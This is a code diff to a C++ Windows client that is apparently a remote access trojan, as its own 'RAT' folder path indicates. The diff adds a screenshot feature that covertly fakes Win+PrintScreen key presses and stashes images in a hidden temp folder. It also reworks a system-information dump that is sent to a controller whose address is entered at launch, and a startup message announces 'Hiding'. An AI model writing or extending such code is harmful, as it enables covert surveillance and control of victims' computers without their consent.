@@ -9,6 +9,10 @@
 #include <iterator>
 #include <WS2tcpip.h>
 #include <Windows.h>
+#include <stdio.h>
+#include <filesystem>
+#include <direct.h>
+#include <Lmcons.h>
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "user32.lib")
@@ -16,50 +20,24 @@
 using namespace std;
 
 typedef unsigned char uchar;             // Custom Data Type
-const string TARGETIP = "192.168.1.6";      // SERVER Ip Address
-const int    TARGETPO = 54000;          // SERVER Port Numbe
-
-// Dumping System information
-class DUMP_SYSINFO {
-private:
-	SYSTEM_INFO sysInfo;
-public:
-	DUMP_SYSINFO() {
-		GetSystemInfo(&sysInfo);
-	}
-	string toString(){
-		string rtval = "";
-		rtval += "OEM ID: " + sysInfo.dwOemId;
-		rtval += "\nNumber of processors: " + sysInfo.dwNumberOfProcessors;
-		rtval += "\nPage size: " + sysInfo.dwPageSize;
-		rtval += "\nProcessor type: " + sysInfo.dwProcessorType;
-		rtval += "\nActive processor mask: " + sysInfo.dwActiveProcessorMask;
-		rtval += "\nReserved Memory: " + sysInfo.wReserved;
-		rtval += "\nProcessor Architecture: " + sysInfo.wProcessorArchitecture;
-		rtval += "\nProcessor Level: " + sysInfo.wProcessorLevel;
-		rtval += "\nProcessor Revision: " + sysInfo.wProcessorRevision;
-		rtval += "\n";
-		return rtval;
-	}
-};
 
 // Some Extended Methods for String
-class STRINGER{
+class STRINGER {
 private:
 	string b;
 
 public:
-	STRINGER(){
+	STRINGER() {
 		this->b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";//=
 	}
-	void erase(string &upper, const string lower){
+	void erase(string& upper, const string lower) {
 		size_t pos = upper.find(lower);
-		if (pos != std::string::npos){
+		if (pos != std::string::npos) {
 			upper.erase(pos, lower.length());
 		}
 	}
 	template <class Container>
-	void split(const std::string& str, Container& cont, char delim = ' '){
+	void split(const std::string& str, Container& cont, char delim = ' ') {
 		std::stringstream ss(str);
 		std::string token;
 		while (std::getline(ss, token, delim)) {
@@ -83,7 +61,7 @@ public:
 		_pclose(pipe);
 		return result;
 	}
-	string base64_encode(const std::string &in){
+	string base64_encode(const std::string& in) {
 		std::string out;
 
 		int val = 0, valb = -6;
@@ -95,15 +73,15 @@ public:
 				valb -= 6;
 			}
 		}
-		if (valb>-6) out.push_back(b[((val << 8) >> (valb + 8)) & 0x3F]);
+		if (valb > -6) out.push_back(b[((val << 8) >> (valb + 8)) & 0x3F]);
 		while (out.size() % 4) out.push_back('=');
 		return out;
 	}
-	string base64_decode(const std::string &in){
+	string base64_decode(const std::string& in) {
 		std::string out;
 
 		std::vector<int> T(256, -1);
-		for (int i = 0; i<64; i++) T[b[i]] = i;
+		for (int i = 0; i < 64; i++) T[b[i]] = i;
 
 		int val = 0, valb = -8;
 		for (uchar c : in) {
@@ -118,6 +96,75 @@ public:
 		return out;
 	}
 };
+
+// Screenshot Class
+class SCREENSHOT {
+private:
+	string currentFileName;
+	string moveToAndRename;
+
+	void changeFolder() {
+		rename(currentFileName.c_str(), moveToAndRename.c_str());
+	}
+
+public:
+	SCREENSHOT() {
+		moveToAndRename = "C:/Windows/TEMP/RAT/SCREENSHOTS/";
+		currentFileName = "C:/Users/%USERNAME%/Pictures/Screenshots/";
+		_mkdir(moveToAndRename.c_str());
+		moveToAndRename.append("/SS");
+	}
+
+	string getScreenshot() {
+		keybd_event((VK_LWIN), 0x5B, 0, 0);
+		keybd_event((VK_SNAPSHOT), 0x2C, 0, 0);
+
+		Sleep(1000);
+
+		keybd_event((VK_LWIN), 0x5B, KEYEVENTF_KEYUP, 0); // Releasing The LWIN KEY
+		keybd_event((VK_SNAPSHOT), 0x2C, KEYEVENTF_KEYUP, 0); // Releasing The SNAPSHOT KEY
+		changeFolder();
+		return "";
+	}
+};
+
+// Dumping System information
+class DUMP_SYSINFO {
+private:
+	SYSTEM_INFO sysInfo; // Information about system hardware
+	OSVERSIONINFOEX osInfo; // Information About Operating System
+
+	// Method to Convert Windows APIs' returned DWORD to String
+	string ConvertToString(DWORD sysDump) {
+		stringstream str_sysDump;
+		str_sysDump << sysDump;
+		return str_sysDump.str();
+	}
+public:
+
+	DUMP_SYSINFO() {
+		GetSystemInfo(&sysInfo);
+
+		ZeroMemory(&osInfo, sizeof(OSVERSIONINFOEX));
+		osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
+	}
+
+	string toString() {
+		string rtval = "";
+		rtval += "HARDWARE INFO\n";
+		rtval += "OEM ID: " + ConvertToString(sysInfo.dwOemId);
+		rtval += "\nNumber of processors: " + ConvertToString(sysInfo.dwNumberOfProcessors);
+		rtval += "\nPage size: " + ConvertToString(sysInfo.dwPageSize);
+		rtval += "\nProcessor type: " + ConvertToString(sysInfo.dwProcessorType);
+		rtval += "\nActive processor mask: " + ConvertToString(sysInfo.dwActiveProcessorMask);
+		rtval += "\nReserved Memory: " + ConvertToString(sysInfo.wReserved);
+		rtval += "\nProcessor Architecture: " + ConvertToString(sysInfo.wProcessorArchitecture);
+		rtval += "\nProcessor Level: " + ConvertToString(sysInfo.wProcessorLevel);
+		rtval += "\nProcessor Revision: " + ConvertToString(sysInfo.wProcessorRevision);
+		return rtval;
+	}
+};
+
 
 class PREDECESSOR{
 private:
@@ -266,6 +313,10 @@ public:
 				DUMP_SYSINFO informater;
 				senddata(informater.toString());
 			}
+			else if (toexecute == "screenshot") {
+				SCREENSHOT screener;
+				senddata(screener.getScreenshot());
+			}
 		}
 	}
 	bool launch(){
@@ -320,8 +371,18 @@ public:
 };
 
 int main(){
+	string TARGETIP;
+	int TARGETPO;
+
+	cout << "Initiating Client!" << endl << endl;
+	cout << "Enter Target Address: ";
+	cin >> TARGETIP;
+	cout << "Enter Target Port: ";
+	cin >> TARGETPO;
+
+	cout << endl << "Hiding ---" << endl;
+
 	CLIENT SillyClient(TARGETIP, TARGETPO);
 	SillyClient.engage();
 	cout << SillyClient.getError() << endl;
-	system("pause");
 }
